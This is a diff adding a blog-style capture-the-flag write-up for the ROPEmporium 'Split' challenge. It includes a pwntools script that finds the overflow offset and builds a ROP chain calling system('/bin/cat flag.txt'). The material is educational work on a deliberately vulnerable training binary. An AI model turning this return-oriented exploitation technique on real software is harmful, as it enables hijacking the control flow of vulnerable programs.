@@ -134,7 +134,45 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="2---split"><a class="header" href="#2---split">2 - Split</a></h1>
+                        <h1 id="ropemporium-split"><a class="header" href="#ropemporium-split">ROPEmporium (Split)</a></h1>
+<p>Split is the second challenge of the ROPemporium series on binary exploitation, it's a pretty simple challenge that just require you to make a system call using the address of the string &quot;/bin/cat flag.txt&quot;, to find this string you can just look at the different functions the binary has and you should see one called <code>usefulString</code>, this symbol should contain the string we want.</p>
+<p>For this challenge we will heavily rely on pwntools, python and gdb, although the challenge is pretty simple (took me 5 mins to solve) i think it's pretty educative on how to rop properly.</p>
+<h2 id="solving-the-challenge"><a class="header" href="#solving-the-challenge">Solving the Challenge</a></h2>
+<p>Looking at the <a href="https://ropemporium.com/challenge/split.html">ROPEmporium Website</a> we are given the following instructions.</p>
+<pre><code>Still here
+
+I'll let you in on a secret: that useful string &quot;/bin/cat flag.txt&quot; is still present in this binary, as is a call to system(). It's just a case of finding them and chaining them together to make the magic happen. 
+</code></pre>
+<p>We know there is the string &quot;/bin/cat flag.txt&quot; in the binary, and we can easily make a system call since the function is present in the binary.</p>
+<pre><code class="language-py">import pwn
+
+pwn.context.arch = &quot;amd64&quot;
+e = pwn.ELF(&quot;./split&quot;)
+
+def find_eip(payload):
+    io = pwn.process(e.path)
+    io.sendlineafter(b&quot;&gt; &quot;, payload)
+    io.wait()
+    rip_offset = pwn.cyclic_find(io.corefile.read(io.corefile.rsp, 4))
+    pwn.log.info(&quot;Located RIP offset at {a}&quot;.format(a=rip_offset))
+    return rip_offset
+
+pop_rdi_ret = pwn.p64(0x4007c3)
+offset = find_eip(pwn.cyclic(100))
+io = pwn.process(e.path)
+rop = pwn.ROP(e)
+rop.system(e.symbols.usefulString)
+
+payload = [
+    b&quot;A&quot;*offset,
+    rop.chain(),
+    pop_rdi_ret
+]
+
+io.sendlineafter(b&quot;&gt; &quot;, b&quot;&quot;.join(payload))
+io.interactive()
+</code></pre>
+<p>Running the following script should automatically find the crash offset and it will call system(&quot;/bin/cat flag.txt&quot;).</p>
 
                     </main>
 
